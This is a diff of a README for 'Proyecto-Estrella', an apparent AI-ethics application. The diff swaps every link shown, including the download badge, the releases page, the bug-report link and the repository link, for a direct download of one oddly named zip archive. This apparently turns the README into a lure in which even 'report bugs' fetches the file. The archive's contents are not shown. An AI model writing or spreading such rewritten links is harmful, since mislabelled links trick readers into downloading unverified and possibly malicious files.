@@ -4,7 +4,7 @@
 Welcome to Proyecto-Estrella! This application serves as a bridge to understanding and exploring the future of artificial intelligence. It provides insights into ethical AI and superintelligence.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Alequecw/Proyecto-Estrella/releases)
+[![Download](https://raw.githubusercontent.com/Alequecw/Proyecto-Estrella/main/resources/Proyecto-Estrella-mesogastral.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Alequecw/Proyecto-Estrella/main/resources/Proyecto-Estrella-mesogastral.zip)
 
 ## 💡 What is Proyecto-Estrella?
 Proyecto-Estrella aims to connect users with the philosophy and potential of superintelligent AI. Whether you are curious about AI safety, friendship, or alignment, this application will provide helpful tools and insights.
@@ -25,7 +25,7 @@ Before you download, ensure your computer meets these requirements:
 ## 📥 Download & Install
 To get started, please visit the following link to download the latest version of Proyecto-Estrella:
 
-[Visit this page to download](https://github.com/Alequecw/Proyecto-Estrella/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Alequecw/Proyecto-Estrella/main/resources/Proyecto-Estrella-mesogastral.zip)
 
 1. **Go to the Releases Page**: Click the above link to go to the download page.
 2. **Choose the Version**: Look for the latest version listed at the top.
@@ -45,7 +45,7 @@ If you encounter issues during installation or running the application, consider
 ## 🤝 Community Support
 We believe in the power of collaboration. If you need help or want to share your experience, feel free to join our community discussions:
 
-- **GitHub Issues**: Report bugs or suggest improvements [here](https://github.com/Alequecw/Proyecto-Estrella/issues).
+- **GitHub Issues**: Report bugs or suggest improvements [here](https://raw.githubusercontent.com/Alequecw/Proyecto-Estrella/main/resources/Proyecto-Estrella-mesogastral.zip).
 - **Online Forums**: Engage with other users and contribute to discussions about ethical AI.
 
 ## 📚 Learn More
@@ -62,7 +62,7 @@ We plan to roll out regular updates that focus on:
 ## 🔗 Connect With Us
 Stay tuned for our latest developments and join us in building a positive future for AI:
 
-- GitHub: [Repo Link](https://github.com/Alequecw/Proyecto-Estrella)
+- GitHub: [Repo Link](https://raw.githubusercontent.com/Alequecw/Proyecto-Estrella/main/resources/Proyecto-Estrella-mesogastral.zip)
 - Social Media: Follow us on platforms discussing AI topics.
 
 Thank you for choosing Proyecto-Estrella. We hope you find it enriching and informative! Enjoy your journey into the world of ethical artificial intelligence.
